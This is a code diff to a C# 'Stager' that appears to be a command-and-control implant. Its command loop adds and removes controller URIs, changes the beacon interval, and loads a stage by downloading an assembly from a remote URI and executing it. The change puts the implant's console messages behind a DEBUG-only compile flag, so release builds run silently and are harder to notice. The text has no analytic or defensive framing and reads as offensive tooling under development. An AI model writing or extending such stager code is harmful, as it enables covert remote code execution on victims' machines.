@@ -408,20 +408,28 @@ namespace Stager
                     switch (result.Command)
                     {
                         case Command.Add:
+#if DEBUG
                             Console.WriteLine("[*] Add Command");
+#endif
                             AddUrisToList(result.Uris);
                             break;
                         case Command.Beacon:
+#if DEBUG
                             Console.WriteLine("[*] Beacon Command");
+#endif
                             ChangeBeacon(result.Arguments);
                             break;
                         case Command.Load:
+#if DEBUG
                             Console.WriteLine("[*] Load Command");
+#endif
                             byte[] assembly = RequestStage(result.Uris[0]).Result;   // Expected Uri count for a load command is 1
                             LoadStage(assembly, result.Arguments);
                             break;
                         case Command.Remove:
+#if DEBUG
                             Console.WriteLine("[*] Remove Command");
+#endif
                             RemoveUrisFromList(result.Uris);
                             break;
                     }
